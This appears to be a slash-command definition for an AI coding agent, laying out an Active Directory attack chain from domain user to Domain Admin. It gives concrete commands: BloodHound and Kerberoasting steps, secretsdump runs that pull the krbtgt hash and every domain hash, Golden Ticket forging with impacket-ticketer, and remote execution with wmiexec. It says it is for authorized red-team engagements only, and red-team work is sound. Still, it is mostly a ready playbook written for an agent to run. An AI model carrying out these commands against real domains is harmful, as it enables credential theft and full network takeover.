---
description: Active Directory attack chain — BloodHound ingestion, Kerberoasting, ADCS ESC abuse, DCSync. Usage: /ad-attack [domain]
tui: opencode
---

# /ad-attack

Active Directory attack chain from domain user to Domain Admin.

**Scope:** Authorized internal VAPT / red team engagements only.

## Usage

```
/ad-attack                           # interactive — provide creds/context
/ad-attack --domain CORP.LOCAL --dc 10.10.10.10
/ad-attack --context "have domain user CORP\jsmith:Pass123"
```

## Quick Win Order

```
1. BloodHound     → shortest path to DA (always run first)
2. Kerberoasting  → crack SPN accounts (low noise, no lockout)
3. AS-REP roast   → dontreqpreauth users
4. ADCS audit     → ESC1-ESC8 (often instant DA)
5. DCSync         → if replication rights found
```

## Session Start

```bash
# What credentials do you have?
# 1. Domain user creds (DOMAIN\user:pass) — use for all Impacket tools
# 2. NTLM hash — use -hashes :HASH
# 3. Kerberos TGT — export KRB5CCNAME=ticket.ccache
# 4. Unauthenticated — start with kerbrute user enum + AS-REP roast

# Identify DC IP
nslookup -type=SRV _ldap._tcp.DOMAIN
# or: nmap -p 88 SUBNET/24 --open  (port 88 = Kerberos = DC)
```

## Full Skill Reference

Load the complete AD attacks skill for all playbooks:

```
Invoke skill: ad-attacks
```

Covers:
- BloodHound: data collection + key Cypher queries
- Kerberoasting: GetUserSPNs + hashcat cracking
- AS-REP Roasting: GetNPUsers + cracking
- ADCS: certipy ESC1-ESC8 enumeration and exploitation
- DCSync: secretsdump + Golden Ticket
- LAPS: password extraction
- Pass-the-Hash/Ticket: lateral movement chains
- Golden/Silver Tickets: persistent access

## After DA — Crown Jewel Access

```bash
# krbtgt hash → Golden Ticket (10-year TGT, survives password reset)
secretsdump.py 'DOMAIN/ADMIN:PASS@DC_IP' -just-dc-user krbtgt

# Domain password dump
secretsdump.py 'DOMAIN/ADMIN:PASS@DC_IP' -just-dc -outputfile all_hashes

# Access any host with Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN administrator
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@TARGET
```
